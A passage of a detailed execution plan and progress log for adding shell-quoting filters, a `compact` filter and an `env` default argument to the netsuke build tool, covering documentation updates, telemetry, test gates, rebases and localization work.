  example is executed by the test suite, ADR-041 records D1-D3, and the roadmap
  entry is ticked.
- Requirements: all of `RM-3.14.8`; `RM-3.14.8` bullet 4 specifically.
- Work:
   1. Write `docs/adr-041-canonical-recipe-shell-quoting-surface.md` following
     the Y-Statement shape of `docs/adr-008-environment-seam-taxonomy.md`
     (`# Architecture decision record (ADR): …`, then `## Status`, `## Date`,
     `## Context and problem statement`, `## Decision`, `## Consequences`).
     Record D1, D2, and D3 with their evidence. Add it to `docs/contents.md`
     after `ADR-026` (`docs/contents.md:170-172`), matching the existing
     one-line-per-entry shape. Re-check the number first, because this plan has
     already lost its ADR number once to drift: at `0ba6672f` the highest
     listed ADR was `adr-026`, and the repository has a history of collisions.
   2. `docs/netsuke-design.md` §4.4: replace "The `default` argument is planned;
     the current implementation only accepts the variable name" with the shipped
     contract, including the empty-string rule and the non-UTF-8 rule.
   3. `docs/netsuke-design.md` §4.5: rename `shell_escape` to `shell_quote`,
     record the two-dialect set and the host-default rule, drop "planned" from
     `shell_join` and `compact`, and link ADR-041.
   4. `docs/netsuke-design.md:687-688` and `:3876-3877`: rename `shell_escape`.
     Re-locate the second by content, not by number: it is the "Implement the
     full suite of custom Jinja functions (`glob`, `env`, etc.) and filters
     (`shell_escape`)" task bullet in the implementation roadmap, which sits
     far below the sections this plan's other citations come from.
   5. `docs/users-guide.md:489-491`: replace the "not implemented in beta3"
     sentence
     with a description of `shell_quote`, its default dialect, and the pointer
     to `docs/stdlib-yaml-and-jinja-guide.md`. Cross-reference
     `docs/users-guide.md:331-399` so a Windows reader understands why the
     default differs.
   6. `docs/users-guide.md:781-782`: replace the sentence beginning "Beta3 does
     not accept a default argument" with the shipped `env(name, default=…)`
     contract, including the empty-string and non-UTF-8 rules.
   7. `docs/stdlib-yaml-and-jinja-guide.md`: add `compact` to "Transform
     collections"; add a new "Build shell recipe text" section documenting
     `shell_quote` and `shell_join` with their dialect rules and purity; update
     the `env(name)` bullet at lines 318-320. Add the tested example:

     ```markdown
     <!-- tested-example: stdlib-optional-rustflags-manifest -->
     ```

     carrying the `RUSTFLAGS` manifest from "Purpose / big picture", with an
     explicit `dialect='sh'` so it is host-independent (R4).
   8. Register `stdlib-optional-rustflags-manifest` in `EXPECTED_EXAMPLE_IDS`
     (`tests/documentation_examples_tests.rs:18-61`, alphabetical) and add it as
     a `#[case]` to `documented_manifest_generates_ninja`.
   9. Add two bounded, label-safe counters beside the existing manifest
     instrumentation, following `docs/adr-009-bounded-redacted-manifest-telemetry.md`:
     `netsuke_manifest_shell_quote_dialect_total{dialect, source}` where
     `source` is `explicit` or `default` (a four-combination label space), and
     `netsuke_manifest_env_default_substituted_total` with no labels. Neither
     carries manifest content, a variable name, or a value. The first makes
     the population exposed to R11 and D10 visible in aggregate; the second
     makes R10 visible. Describe both with `describe_counter!`.

     Neither counter will be exported unless it is also admitted by
     `src/observability_recorder.rs` — add both names to the `matches!` list
     in `accepts_name` and both label sets to `accepts_counter_registration`.
     This is constraint 13, and it fails **silently**: an unadmitted series
     returns a `Counter::noop` handle, so the build, the lint, and every test
     pass while the counter records nothing. The existing
     `ENV_LOOKUP_TOTAL => exact_labels(key, &[(OUTCOME_LABEL,
     &ENV_LOOKUP_OUTCOME_VALUES)])` arm at
     `src/observability_recorder.rs:194` is the shape to copy, and
     `src/observability_recorder.rs`'s own tests assert that the admitted
     vocabulary and the emitting vocabulary agree — extend them.

     For `netsuke_manifest_env_default_substituted_total`, first check whether
     the series earns its keep at all. `env_telemetry::record_env_lookup`
     already counts every lookup as `success`, the `success` count minus the
     call count is not observable, and the `tracing::debug!` from EP-M1
     already records each substitution. A counter that no dashboard can
     distinguish from "no substitutions happened" is noise. If it ships, say
     in one sentence what an operator learns from it that the `success`
     series and the debug event do not already say; if that sentence cannot be
     written, drop the counter and record the decision.
   10. Write the precise guide contract for each helper, not a summary. At
     minimum: `shell_quote` renders one string as exactly one word for the
     named shell, and for `dialect='sh'` a POSIX shell splitting the output
     produces exactly one field byte-identical to the input; the empty string
     renders as `''`, not as nothing; the subject must be a string, and
     numbers, booleans, sequences, mappings, `none`, and undefined are errors;
     tab, escape, and non-ASCII text are preserved, while NUL, carriage
     return, and line feed are rejected. `shell_join` never drops an element,
     so `['']` renders as one empty word — that is why `compact` and
     `shell_join` are separate helpers — it does not flatten a nested list,
     and its separator is exactly one space. `compact` drops `none`,
     undefined, and the empty string only: `0`, `false`, `[]`, `{}`, and a
     whitespace-only string are retained, which is what distinguishes it from
     MiniJinja's `select`. State that `shell_quote` and `shell_join` are
     filters with no function form, and that both are correct **only in
     unquoted argv position**.
   11. `docs/developers-guide.md`: extend the quoting-paths paragraph at lines
     445-458 to name the new fourth path — `src/shell_word.rs` as the
     single recipe-shell word quoter used by both `quote_path` and the
     `shell_quote`/`shell_join` filters — and state that
     `src/stdlib/command/quote.rs` and `shell_single_quote` remain distinct.
     Also record: the "add a helper to both registration surfaces" convention;
     the 35-catalogue message rule and the requirement to copy the bracketed
     `[netsuke::jinja::…]` code verbatim into every translation; the rule that
     `Value::try_iter()` is not a sequence check (D8); the argument-style rule
     that trailing `Option<T>` is for options reading naturally in a fixed
     order while `Kwargs` is for independent named options and any enumerated
     value set expected to widen; and the deliberate query-surface dialect
     divergence.
   12. `docs/repository-layout.md`: add `src/shell_word.rs` and
     `src/stdlib/recipe_text/`, and record the `quote.rs` →
     `child_argument.rs` rename under `src/stdlib/command/`.
   13. `docs/rfcs/0006-ansible-inspired-template-standard-library.md` §§8.9 and
     13.3: record the amended dialect set and note that 3.14.8 delivered it.
     Keep the edit to those two locations (R3).
   14. `CHANGELOG.md`: one entry under the unreleased heading, following the
     Common Changelog style already used in the file.
   15. `docs/roadmap.md:343-356`: tick 3.14.8 and all four sub-bullets; rewrite
     the trailing `Note:` to describe what shipped. Add a one-line note to
     `RM-6.8.3` (lines 1162-1169) recording that 3.14.8 delivered the canonical
     name and the dialect argument, and that only the wider RFC 0006 dialect
     set remains. Do **not** tick 6.8.3.
- Acceptance evidence: `make markdownlint`, `make nixie`, `make check-fmt`, and
  `make test` all pass; `cargo nextest run --test documentation_examples_tests`
  passes, proving the `RUSTFLAGS` manifest generates valid Ninja.
- Conformance check: no `shell_escape` reference remains
  (`grep -rn "shell_escape" docs/ src/` returns nothing); every upstream
  identifier in `Conformance basis` is either satisfied or has a recorded,
  accepted deviation; the RFC 0006 amendment is the only upstream document
  changed.
- Recovery: documentation-only; revert individually.
- Remaining gaps: none for `RM-3.14.8`.
- Compatibility decision: none required.

## Concrete steps

All commands run from the repository root,
`/home/leynos/.lody/repos/github---leynos---netsuke/worktrees/c72b2360-e95a-451a-b637-1e84cf3eb4b8`,
on branch `3-14-8-jinja-command-helpers-to-match-documented-ergonomics`.

Capture every long-running gate through `tee`, using the project's log naming
convention so output survives truncation:

```sh
make test 2>&1 | tee "/tmp/test-$(get-project)-$(git branch --show-current).out"
```

Delegate full gate runs to the `scrutineer` subagent rather than running them
in the planning context; read the cited log on failure instead of re-running.

Per-milestone loop:

```sh
# 1. Red: write the failing test, then run only it.
cargo nextest run --test manifest_env_tests 2>&1 \
  | tee /tmp/red-3-14-8.out

# Expect, before implementation:
#   FAIL [   0.012s] netsuke::manifest_env_tests env_default_substitutes_for_absence
#   ... unknown keyword argument `default`

# 2. Green: implement, then re-run the same focused command.
cargo nextest run --test manifest_env_tests 2>&1 | tee /tmp/green-3-14-8.out
#   Summary [   0.9s] 14 tests run: 14 passed

# 3. Confirm no snapshot drifted.
git status --short src/snapshots tests/snapshots
#   (expect no output)

# 4. Full gates, sequentially — never in parallel.
make check-fmt && make typecheck && make lint && make doc-coverage && make test

# 5. Commit.
git add -A && git commit
```

For EP-M4, run `cargo build` before `make test`: the localization audit is a
build-script failure, and finding a missing catalogue entry there is far faster
than through the test suite.

```sh
cargo build 2>&1 | tee /tmp/l10n-3-14-8.out
# A missing catalogue looks like:
#   error: localization audit failed:
#   - missing in ar: stdlib.shell.quote.not_string
#   - missing in cs: stdlib.shell.quote.not_string
```

## Validation and acceptance

Quality criteria — what "done" means:

- **Tests**: `make test` passes. The new suites
  `tests/shell_filter_property_tests.rs` and
  `tests/stdlib_manifest_query_tests.rs` pass, and the five new
  `tests/features/stdlib.feature` scenarios pass through `tests/bdd_tests.rs`.
  Those five are `shell_quote makes a metacharacter-bearing value one sh word`,
  `shell_join quotes each element separately`,
  `shell_quote rejects an unknown dialect and names the accepted set`,
  `shell_quote rejects a value containing a line feed`, and
  `shell_quote rejects a positional dialect`. They are distinct from the file's
  pre-existing `shell filter` scenarios (the `shell` *command* filter added
  long before this plan) and from EP-M2's two `compact` scenarios, so a grep
  for "shell" in that file over-counts: check the scenario names, not the
  substring. `tests/documentation_examples_tests.rs` passes with the new
  example id.
- **Verification**: OBL-SH-ROUNDTRIP, OBL-PS-ROUNDTRIP, OBL-ONE-WORD,
  OBL-JOIN-SPLIT, OBL-COMPACT, OBL-ENV-DEFAULT, OBL-DIALECT-TOTAL,
  OBL-NINJA-STABLE, OBL-NO-ESCAPE, and OBL-QUERY-SURFACE are each discharged,
  with their negative controls observed failing at least once and recorded in
  `Artefacts and notes`. AXIOM-2's residual gap on non-Windows hosts is stated
  in ADR-041.
- **Lint and typecheck**: `make check-fmt`, `make typecheck`, `make lint`, and
  `make doc-coverage` all exit zero. `make markdownlint` and `make nixie` pass.
- **Performance**: no benchmark threshold applies.
  `tests/shell_filter_property_tests.rs` must complete within 10 seconds under
  `cargo nextest run`; if it does not, reduce the subprocess property's `cases`
  before considering `#[ignore]`, and escalate if 32 cases is still too slow.
- **Security**: `shell_quote`'s soundness is the security property, and
  OBL-SH-ROUNDTRIP plus OBL-ONE-WORD are its evidence. Confirm that no new
  message text includes an environment variable name or value, matching the
  deliberate omission at `src/manifest/env_reader.rs:121-127`.

Behavioural acceptance, verifiable by hand. Note that the interpolation sits in
**unquoted** position — this is the precondition, and the first draft of this
plan got it wrong:

```sh
cd "$(mktemp -d)"
cat > Netsukefile <<'EOF'
netsuke_version: "1.0.0"
vars:
  base_flags: "-D warnings"
targets:
  - name: stamp.txt
    # POSIX recipe shell: `env`, the `VAR=value` prefix, `sh -c` and the single
    # quotes all assume `sh`. The dialect is pinned per D10.
    command: >-
      env RUSTFLAGS={{ [base_flags, env('RUSTFLAGS', default='')]
        | compact | join(' ') | shell_quote(dialect='sh') }}
      sh -c 'printf "%s\n" "$RUSTFLAGS"' > {{ outs }}
defaults:
  - stamp.txt
EOF
netsuke --progress never generate --output build.ninja
grep RUSTFLAGS build.ninja
```

Expect, with `RUSTFLAGS` unset, the recipe to carry `-D warnings` as exactly
one shell word in the crate's fragmented form:

```plaintext
  command = env RUSTFLAGS=-D' warnings' sh -c 'printf "%s\n" "$$RUSTFLAGS"' > stamp.txt
```

The `$$` is Ninja escaping applied at the writer boundary per ADR-014; Ninja
un-escapes it to a single `$` before the shell sees it. Running `netsuke build`
then writes exactly `-D warnings` to `stamp.txt` — quote characters absent,
because they were shell syntax rather than data.

With `RUSTFLAGS='-C target-cpu=native'` exported, expect the two flag groups
joined by one space and quoted as a single word:

```plaintext
  command = env RUSTFLAGS=-D' warnings -C target-cpu'=native'' sh -c … > stamp.txt
```

In both cases there must be no `${...:+...}` expansion anywhere, and no empty
argument when `RUSTFLAGS` is unset. Confirm the word count directly rather than
by eye:

```sh
sh -c "set -- -D' warnings -C target-cpu'=native''; echo \$#"
# 1
```

Contrast that with the defective form this plan originally specified, which
placed the interpolation inside double quotes:

```sh
sh -c 'printf "%s\n" "RUSTFLAGS=-D'"'"' warnings'"'"'"'
# RUSTFLAGS=-D' warnings'      <- literal quote characters; the value is corrupt
```

These expectations were derived from `shell-quote-0.7.2` and checked against a
real `/bin/sh`; see the note under the behavioural specification for the two
counter-intuitive rules that produce them.

## Idempotence and recovery

Every step is re-runnable. `make` targets are pure checks or in-place
formatters. The only step that mutates tracked files unexpectedly is
`make fmt`, which may reformat Markdown that was already non-canonical; commit
such reformatting separately.

Each milestone is one commit, so `git revert <sha>` restores the previous
plateau. EP-M3 is a pure move, so reverting it cannot change generated output.
No step writes outside the repository except `tee` logs under `/tmp`.

If the localization audit fails mid-edit, the tree still builds once every
catalogue has the key; there is no partial state to clean up.

## Progress

- [x] (2026-09-08) Reconnaissance complete: `env()` implementation and seam,
      registration surfaces, recipe-shell semantics, existing quoting paths,
      localization gate, test and documented-example infrastructure.
- [x] (2026-09-08) Design decisions D1-D7 recorded; D1 and D2 confirmed by the
      requester.
- [x] (2026-09-08) ExecPlan drafted.
- [x] (2026-09-09) Six-lens community-of-experts review completed and applied.
      Falsified three MiniJinja assumptions (D4, D8, AXIOM-4), corrected the
      `quote_path` citation, restated the encoder inventory as five, redrew
      three module boundaries, fixed the acceptance transcript's
      double-quoted-context defect, added the threat model, and fused the
      former EP-M4 and EP-M5 to close R11.
- [x] (2026-09-19) Plan approved: the requester directed implementation to
      proceed, with CodeRabbit review after each milestone and a commit per
      milestone.
- [x] (2026-09-19) Branch rebased onto `origin/main` (`0ba6672f`, previously
      `81d44f89`). Clean, with no conflicts: all eight branch commits touch only
      this ExecPlan file.
- [x] (2026-09-19) Post-rebase reconciliation. Found and recorded six things
      upstream had already landed that this plan scheduled, depended on, or
      assumed pending: the `src/manifest/registration.rs` extraction (R9
      resolved as convergence, not collision), ADR-026 with the
      `EnvAccessPolicy`/`ManifestEnvironment` seam, `ManifestLoadInputs` and
      the resource-ceiling budgets, the `netsuke_manifest_env_lookups_total`
      bounded telemetry series, and a shifted document-line frame. Consequences
      applied: the plan's ADR is renumbered `021` → `027`; every
      `Conformance basis` anchor is re-taken against `0ba6672f`; EP-M1's
      extract step is deleted and replaced by an extend step;
      `env_var_with_default` gains the policy parameter so `default=` cannot
      bypass ADR-026; Stage A's three go/no-go checks are re-checked and
      recorded; and `src/manifest/render.rs` is flagged as being exactly at the
      400-line cap, with `src/manifest/mod.rs` freed from it.
- [x] (2026-09-19) EP-M1 extraction committed as a pure move (`16c3cfe6`) with
      green gates: `register_env_function` and `register_glob_function` now
      live in `src/manifest/registration.rs`, and `src/manifest/mod.rs` fell
      from 259 to 252 lines.
- [x] EP-M1 `env(name, default=...)`. Red tests and both new localization key
      sets are in place; `env_var_with_default`, `env_default_from_kwargs`, the
      registration, and the query-surface stub are implemented and green; the
      three `manifest.feature` scenarios and their fixtures are added and pass.
      Post-implementation gate triage: the first `make lint` run surfaced four
      findings, all resolved — `doc_markdown` and `option_if_let_else` in
      `src/manifest/registration.rs`, a `single_match_else` /
      `option_if_let_else` *contradiction* on one site in
      `src/manifest/env_reader.rs` (resolved by extracting
      `substitute_fallback`), `too_many_arguments` and a second `doc_markdown`
      in `tests/manifest_env_tests.rs`, and a Whitaker
      `no_expect_outside_tests` in `src/manifest/tests/env_function.rs`, whose
      shared `assert_resolution` helper was reduced to a comparable
      `Resolved` enum so no `expect` sits outside a `#[test]` body. `make lint`
      is now green. Committed as `5d66db48` after a full green gate run.
- [x] EP-M1a (post-review): CodeRabbit's `--agent` pass on `5d66db48` returned
      13 unique findings. Seven were real plan-document drift and are now
      fixed: a stale three-argument `env_var_with_default` sketch, a stale
      "undefined or non-string" doc line contradicted by D4's own EP-M1 note, a
      `dialect` sketch still reading `Option<String>` where D4 revised it to
      `Option<Value>`, `ShellDialect::ACCEPTED` named where the plan declares
      `ALL` (three sites), a five-case partition described against a four-case
      outcome set, and two literal cut-and-paste duplications. Two were real
      code findings, both fixed: `tests/manifest_env_tests.rs` was 420 lines
      against AGENTS.md's explicit 400-line cap, so the `default`-argument cases
      moved to `tests/manifest_env_tests/default_argument.rs` behind a `#[path]`
      declaration (the split halves are 246 and 189 lines), and the fallback
      path had no telemetry coverage, so
      `a_substituted_fallback_counts_one_success_series` was added to
      `src/manifest/tests/env_telemetry.rs` and proved non-vacuous by a negative
      control. The remaining four findings — translation wording in the `nl`,
      `nb`, `id`, and `it` catalogues — were rejected as hallucinations: the
      text each finding quotes appears in **no** catalogue, in any locale.
      The split then caused two *new* clippy findings, both because lifting code
      out of a `#[test]` body also lifts it out of `clippy.toml`'s
      `allow-expect-in-tests` exemption: `needless_pass_by_value` on
      `render_first_command`'s reader parameter, and `expect_used` on the shared
      `ensure_template_is_rejected`. Both were fixed structurally rather than by
      adding `#[expect]` — the reader is now taken by reference, and the helper
      returns the error via a `let … else`, matching the sibling module's own
      style. See `Surprises & discoveries` for the general lesson. With the
      round's edits applied, all seven commit gates pass again — `check-fmt`,
      `lint` (all four sub-targets, this time including `github-actions-lint`),
      `typecheck`, `markdownlint`, `doc-coverage` (98.80%), `test` (3213/3213
      plus doctests), and `nixie` — and the tree was confirmed unmutated by
      comparing `git status --short` and `git rev-parse HEAD` either side of the
      run.
- [x] EP-M2 `compact`. Committed as `683a166b`, the first fully green milestone
      of this plan: all seven gates pass (check-fmt, lint with all four
      sub-targets, typecheck, markdownlint, doc-coverage 98.80%, test 3225/3225
      plus doctests, and nixie 143 diagrams), with `git status --short` empty on
      both sides of the run. Targeted selections: `std_filter_tests` 130/130 and
      `stdlib_manifest_query_tests` 4/4, the latter including
      `query_surface_renders_its_permitted_helpers`, whose new `compact` table
      row is the conformance check the milestone asks for. Logs:
      `/tmp/nextest-std-filter-3-14-8-…out`,
      `/tmp/nextest-query-surface-3-14-8-…out`, and the gate logs under
      `/tmp/<gate>-netsuke-3-14-8-jinja-….out`. Restart notes, all of which
      cost time to rediscover. The registration
      belongs in `register_filters`, not beside the private filter bodies,
      because `src/stdlib/register.rs` calls `collections::register_filters`
      from both `register_read_only_helpers` and `register_query_helpers`; a
      registration placed outside it reaches only the surface being edited. The
      blank predicate must treat undefined as blank as well as `none` while
      retaining `0`, `false`, and whitespace — so a test asserting Python-style
      `join` output must expect `False`, not `false`, and `ValueKind`'s spelling
      of the boolean kind is `"bool"`, not `"boolean"`. The split under
      `tests/std_filter_tests/collection_filters/` was forced by AGENTS.md's
      400-line cap, not by the plan's refactor step: the flat file reached 473
      lines once the new cases landed, against 212 at HEAD. `compact_property`'s
      `FileFailurePersistence::Direct` path is
      `tests/std_filter_tests.proptest-regressions`, which does not yet exist
      because nothing has failed; that is expected, not a missing file. The
      deterministic witness case deliberately omits the whitespace-only member
      the property generates, because `join` renders `" "` indistinguishably
      from `""` and an unedited expectation would have been validated against a
      run in which it passed for the wrong reason; the property carries that
      case instead.
- [x] EP-M3 shared recipe-shell quoting seam. `src/shell_word.rs` holds the
      single `quote_word` encoder, `is_recipe_admissible`, and `ShellDialect`;
      `quote_path` in `src/ir/cmd_interpolate/mod.rs:137` is a one-line
      delegation; `RecipeShell::dialect()` maps the three interpreters onto the
      two dialects; `validate_ninja_value` in `src/ninja_gen_escape.rs:47`
      delegates to the shared predicate rather than carrying its own copy; the
      `//!` header states the leaf position required by the milestone's refactor
      step. Generated Ninja is unchanged — see the commit entry below for the
      non-vacuity evidence. Epistemic note: the delivery moved one item the
      milestone's Green step had not asked for, and deferred one that
      `OBL-DIALECT-TOTAL` implies. `ShellDialect::ALL`/`as_str`/`parse` were
      written here and then removed: they exist only to serve the recipe-text
      filters' `dialect` keyword argument, whose consumer arrives in EP-M4, and
      no attribute could mark them dormant without lying in one profile —
      `--all-targets` (the profile the gates use) compiles the unit tests that
      call them, so a `dead_code` *expectation* there is unfulfilled and warns,
      while the same expectation in the lib-only profile is fulfilled. The trio
      therefore lands with its consumer. `OBL-DIALECT-TOTAL`'s artefact is
      consequently `src/shell_word.rs`'s test module **as EP-M4 leaves it**; the
      test shipped here covers only the `RecipeShell` → `ShellDialect` half,
      which is the half EP-M3 makes true. The error-text enumeration half of
      that obligation cannot exist before the filter that renders it.

  Two plan defects surfaced while discharging the Green step. First, the
  milestone requires `StdlibConfig::with_recipe_shell` (lines 1878, 1890,
  1901) while `Surprises and discoveries` says EP-M4 adds the `dialect`
  field (line 2572) — the two cannot both hold. Resolved in favour of the
  milestone text, because EP-M4's own Red step *uses* the builder at line 1931
  and a Red step cannot use an API the Green step has not yet added. Second,
  `src/stdlib/config/mod.rs` was already at 383 lines against AGENTS.md's
  400-line cap, and the field plus builder pushed it to 405, so the
  recipe-shell builder and its accessor went into a new sibling
  `src/stdlib/config/recipe_shell.rs` — the same clustering `which.rs` and
  `ambient.rs` already use, and the same remedy the plan's own line 2572
  prescribes. The accessor is `#[cfg(test)]` until EP-M4 supplies its caller: a
  `pub(crate)` item with no reader is dead code, and neither `allow` nor
  `expect` marks it dormant truthfully, since the new tests make an `expect`
  unfulfilled in the `--all-targets` profile the gates run while the lib-only
  profile fulfils it. The `pub` builder needs no such treatment — `pub` items
  are never dead. EP-M4 removes the gate with the caller.
- [x] (2026-09-27) Branch rebased onto `origin/main` (`ebcedaef`, previously
      `0ba6672f`), 40 commits of drift. Pre-rebase head `be2733a1` is retained
      at `refs/backup/3-14-8-pre-rebase-20260927` and its 15 patch-ids were
      captured before the rewrite. All 15 commits replayed; **no tree was
      dropped**. Fourteen are byte-identical, which `git range-diff` reports
      with `=` and a matching `git patch-id --stable` digest for each. Only
      EP-M3 differs (`!`), because it is the one commit whose resolution has
      content, and it differs **only** across the three keep-both regions of
      `src/stdlib/config/mod.rs`; its per-commit `--stat` is unchanged at eight
      files, 659 insertions, 22 deletions. `git merge-tree --write-tree` had
      predicted exactly one conflicting path against four auto-merged ones, and
      that is what happened. The conflict is a pure adjacent-addition collision:
      upstream added `mod clock;`, the `time::WallClock` import, a `clock:
      WallClock` field and its `WallClock::default()` initializer in the same
      three regions where EP-M3 adds `mod recipe_shell;`, the `RecipeShell` and
      `ShellDialect` imports, a `dialect: ShellDialect` field and its
      `RecipeShell::host_default().dialect()` initializer. Both sides were kept
      at every region, so the resolution is the union of two independent
      additions and neither side's work is amended. The merged file is 397
      lines against AGENTS.md's 400-line cap — 6 more than upstream's 391
      because EP-M3's five lines land in a file that was already the binding
      constraint on this milestone, and 3 lines of headroom remain. Each
      auto-merge was read rather than trusted: upstream's four are `Arc`-reader
      plumbing in `src/manifest/mod.rs`, a `Kwargs`-taking `env` stub in
      `src/stdlib/register.rs`, a `time_functions` module declaration in
      `tests/std_filter_tests.rs`, and doc-comment/vocabulary renames in
      `src/ir/cmd_interpolate/mod.rs`; no hunk range of theirs overlaps EP-M3's,
      and the only semantic pairing is that upstream's deletion of
      `try_match_dollar_placeholder` leaves the `find_substitution` call EP-M3
      depends on intact, which was confirmed by grep before continuing.
- [x] (2026-09-27) The `ebcedaef` rebase created a 400-line-cap regression in
      `src/stdlib/register.rs` that neither side owned. The file left the
      merge-base at 393, upstream grew it to 398, and EP-M1's `Kwargs` change
      to the `env` query stub added 3 more, reaching 401. Neither contribution
      is individually at fault and the pre-rebase tree genuinely passed — the
      cap is crossed only by their sum, which is exactly the kind of defect a
      rebase manufactures. The +3 is not revertible: upstream routes the `env`
      function through a `Kwargs`-taking path, so a stub without `_kwargs`
      panics at runtime on a `default=` call, replacing a clean diagnostic with
      a crash. The file was split instead: the query-disabled cluster (the
      marker, the error constructor that appends it, and the two registration
      functions that raise it) moved to `src/stdlib/register/query_helpers.rs`,
      declared with an explicit `#[path]` so `clippy::self_named_module_files`
      stays satisfied. The parent keeps
      `MANIFEST_QUERY_DISABLED_HELPER_MARKER` declared at `pub(super)` because
      the child appends it and the parent's consumers name the same constant,
      and the `pub(crate)` predicate is re-exported from the parent so every
      `super::is_manifest_query_disabled_error` path in the tree still
      resolves. Result: parent 401 → 297, child 135, and no file in `src/`
      exceeds 400. Verified with `cargo check --lib` and, crucially, with
      `cargo check --all-targets`, both under `-D warnings` — the lib-only
      profile does not compile `#[cfg(test)]` modules, so it would not have
      proved the split sound.
- [x] (2026-09-27) The split above was performed by hand-retyping the cluster
    rather than by moving the text, and three closures drifted. Only one was
    caught, and the reason is worth recording because it generalizes.

    Three closures changed against the pre-image at
    `719e7beb:src/stdlib/register.rs:180-291` (cited by that commit's hash, not
    as `HEAD~1`, which stopped naming it the moment the split was committed).
    `digest` gained an arity: the pre-image took
    `(_value: String, _length: Option<usize>, _algorithm: Option<String>)` and
    the committed form took `(_state: &State, _value: Value, _algorithm:
    String, _encoding: Option<String>)`. `linecount` changed return type,
    `Result<usize, Error>` to `Result<u64, Error>`. `hash` changed
    registration kind and arity, from `add_filter(_value: String,
    _algorithm: Option<String>)` to `add_function(_value: Value, _kwargs:
    Kwargs)`.

    Only `digest` was caught. It failed because an arity mismatch raises
    during argument binding, before the stub body runs, so it produced
    "missing argument"
    rather than the helper's name. `linecount` and `hash` changed types and
    registration kind while `case_11_hash` still passed *with `hash`
    registered as a function*: the case asserted only that the error text
    contains the helper's name, and MiniJinja's own `unknown filter: hash`
    contains it too. The assertion could not distinguish "deliberately
    disabled" from "never registered at all" — so a name-only assertion
    silently accepted a stub that had stopped being a stub.

    Fixing that assertion to require the marker exposed a second vacuous
    case, `case_13_file_test`, which had been passing for the wrong reason
    since before this branch: `register_file_tests` is reachable only from
    `register_read_only_helpers`, so `'x' is file` failed as "unknown test:
    test file is unknown". File tests call `symlink_metadata`, so they do
    disclose host state and belong in the disabled set; stubs are now
    registered for them, with the names taken from the parent's `FILE_TESTS`
    rather than retyped, so the two lists cannot drift. That the compiler
    enforces the wiring is a useful property: with the stub registration
    removed, the now-unused function is a `-D warnings` error.

- [x] (2026-09-27) Gate run at `17e8386a`, the commit that cleared the
    CodeRabbit review. Six of seven gates green: `check-fmt` 8 s, `lint`
    129 s with all four prerequisites and all five `lint-python` stages
    verified as actually run, `typecheck` 17 s, `markdownlint` 14 s (165
    files, 0 errors), `doc-coverage` 40 s (98.82%, 4772/4829), `nixie` 3 s.
    `make test` was **red**: `test-nextest` aborted with Error 100 after
    `packaged_manifest_retains_build_script_sources` hit the 300 s nextest
    termination cap, so `doctest` never ran and is unverified.

    This was recorded rather than waved away, because "not ours" is not the
    same claim as "intermittent". What was measured: the test ran in the
    serialized `nested-cargo-builds` group, which bounds concurrency but not
    queueing; a preserved log of the previous head shows the identical test
    passing at 213.380 s with `cargo publish --dry-run completed
    elapsed_seconds=212.57`, so effectively the whole test is one cold build
    with 87 s of headroom; the timed-out run never reached that log line, so
    it was killed mid-build; host load was 53.07, with two sibling netsuke
    worktrees running their own `make lint` and `make test`; and the branch
    touches neither `Cargo.toml` nor `Cargo.lock`, so the dependency graph
    that cold build compiles is byte-identical to the base and cannot have
    grown.

    The decisive point is that this test spans 243 s at load ~5 (passes) to
    over 300 s at load 52 (timeout) on an unchanged commit on this host. A
    local re-run is therefore evidence about the host, not about the branch.
    CI is the stable oracle, and it runs the `Doc-tests` blocks independently
    of the local fail-fast, so it settles `doctest` as well. The branch was
    pushed fast-forward (`94b9b247` to `17e8386a`) and CI was asked to cover
    exactly this commit.

- [x] (2026-09-27) EP-M4 catalogue work. The eight `stdlib.shell.*` keys now
    exist in all 35 catalogues, and `cargo check --all-targets --all-features`
    passes: the build-script localization audit that had been reporting "missing
    in *every* locale" for all eight is green.

    The two wrapper keys (`stdlib.shell.args_error`, `stdlib.shell.unquotable`)
    are byte-identical to en-GB, because `tests/locale_catalogue_tests.rs` pins
    the bracketed code and the audit compares placeholder sets, not prose. The
    six text keys are translated per `docs/localization-styleguide.md`.

    The RTL marking is computed, not hand-applied. `tests/locale_direction_tests.rs`
    requires every rendered fragment of ar/fa/he to open with U+200F or a
    right-to-left character, so the prefix is needed exactly when the first
    character is neither. That is the same rule whether the value is a wrapper
    (`‏[netsuke::jinja::shell::args] { $details }`) or a sentence opening on an
    identifier, and it is a different rule from `DIRECTION_NEUTRAL`, which
    exempts a key outright. `stdlib.which.args_error` is exempt; these eight are
    not, so `args_error` and `unquotable` carry the mark in all three. The six
    text keys split: `dialect_invalid` and `control_character` open on native
    script and need nothing, and the other four open on `shell_quote`,
    `shell_join` or `{ $filter }` in some locales and on native script in others
    — in `ar` the four all begin in Arabic, so only `positional_option` (which
    opens on the `{ $filter }` placeable) takes the mark.

    A placeable-parity check over all 35 catalogues confirms each key's
    `{ $name }` set is identical everywhere, and each locale's key order and key
    count (8) match en-US.

- [x] (2026-09-27) EP-M4 runner plumbing, with its negative control recorded.
    `ExecutionContext.graph_generation.recipe_shell` now reaches the filters:
    `ManifestLoadInputs` carries it (resolved once by the runner and passed in,
    not re-read), `graph_generation::generate_ninja_with_shell` supplies it,
    `graph::handle_graph` takes the `ExecutionContext` instead of only the
    reporter, and `ManifestLoadMode::Full` carries it into the `StdlibConfig`
    built in `src/manifest/query.rs`. The public
    `manifest::from_path_with_policy_and_environment_and_limits` gained a
    `RecipeShell` parameter — the foreseen tolerance-2 breach — and
    `RecipeShell::host_default` went from `pub(crate)` to `pub` to complete it,
    because a caller with no resolved interpreter otherwise has no way to name
    a valid value for the new parameter. The convenience wrappers in
    `path_loaders.rs` pass `host_default()` and so keep their old behaviour.
    The query path is unchanged: `ManifestLoadMode::ManifestQuery` still
    carries no shell, and it never needed to. The divergence this sentence
    originally claimed is **real but masked**, and an earlier version of this
    paragraph asserted the opposite — that both surfaces resolve through
    `RecipeShell::host_default` and so cannot differ. They can. The build path
    seeds that default and then *overwrites* it: `src/runner/mod.rs:153`
    resolves the shell from `NETSUKE_WINDOWS_SHELL` and
    `src/manifest/query.rs:142` passes it to `with_recipe_shell`, while
    `register_query_helpers` (`src/stdlib/register.rs:199`) applies no override.
    On a Windows host with `NETSUKE_WINDOWS_SHELL=bash` the build therefore
    quotes for `Sh` and `help targets` for `PowerShell`. What is preserved here
    is an *agreement on this host* and a deliberate divergence elsewhere.

    The hazard the plan named is real too, but conditional rather than
    unreachable. On Unix `resolve_recipe_shell_with` returns before it reads the
    environment; on Windows there is no such early return, but `execute_help`
    returns first (`:153`), so the query never resolves a shell on either
    platform. Hoisting the resolution above that return would make a
    metadata-only query reject a malformed `NETSUKE_WINDOWS_SHELL`, which is why
